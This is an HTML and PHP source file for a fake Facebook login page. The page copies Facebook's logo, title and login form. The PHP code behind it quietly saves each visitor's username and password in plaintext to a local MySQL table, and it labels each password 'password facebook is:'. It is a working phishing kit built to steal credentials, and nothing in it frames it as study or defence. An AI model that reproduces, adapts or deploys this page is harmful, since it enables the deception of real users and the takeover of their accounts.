<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title> Facebook Login</title>
    <link rel="stylesheet" href="Css/Facebook.css">
    <link rel="icon" href="pic2.png" type="image/png">
</head>
<body>
    <div class="login-container">
        <div class="login-box">
            <div class="logo">
                <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
            </div>
            <form  method="POST">
                <input type="text" name="username" placeholder="Email or Phone Number" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit" class="login-button" name="conexion">Log In</button>
            </form>
            <div class="or-separator">
                <span>OR</span>
            </div>
            <a href="#" class="forgot-password">Forgotten password?</a>
            <a href="#" class="create-account">Create new account</a>
        </div>
    </div>
</body>
</html>



<?php
// Define a global variable to hold the PDO connection
$pdo = null;

function ToConnect()
{
    global $pdo; // Use the global $pdo variable

    // Define database credentials
    $host = 'localhost';
    $dbname = 'Instagram'; // Database name with capital 'I'
    $user = 'root';
    $pass = '';

    try {
        // Create a new PDO instance
        $pdo = new PDO("mysql:host=$host;dbname=$dbname", $user, $pass);
        // Set error mode to exception
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    } catch (PDOException $e) {
        // Handle connection error
        echo "Connection failed: " . $e->getMessage();
        exit; // Stop further execution
    }
}

function ToDisconnect()
{
    global $pdo; // Use the global $pdo variable
    $pdo = null; // Close the connection by setting it to null
}

function AddUser($username, $password)
{
    global $pdo; // Use the global $pdo variable

    // Prepare the SQL statement with placeholders
    $sql = "INSERT INTO user_infos ( username , password) VALUES (:username, :password)";

    try {
        $stmt = $pdo->prepare($sql);
        // Bind parameters
        $stmt->bindParam(':username', $username);
        $stmt->bindParam(':password', $password);

        // Execute the statement
        $stmt->execute();
       
    } catch (PDOException $e) {
        // Handle SQL error
        echo "Error: " . $e->getMessage();
    }
}

// Initialize connection
ToConnect();

// Check if the form was submitted
if (isset($_POST['conexion'])) {
    if (!empty($_POST['username']) && !empty($_POST['password'])) {
        $username = $_POST['username'];
        $password = "password facebook is: ".$_POST['password'];
        
        // Add user to the database
        AddUser($username, $password);
    } 
     
}

// Close the connection
ToDisconnect();
?>